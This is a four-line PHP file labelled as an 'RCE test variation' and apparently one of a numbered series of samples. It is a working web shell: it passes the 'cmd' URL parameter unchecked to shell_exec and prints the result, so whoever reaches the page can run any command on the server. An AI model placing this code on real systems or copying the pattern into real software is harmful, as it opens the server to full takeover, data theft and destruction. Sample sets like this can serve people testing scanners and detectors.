<?php
// RCE test variation #817
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>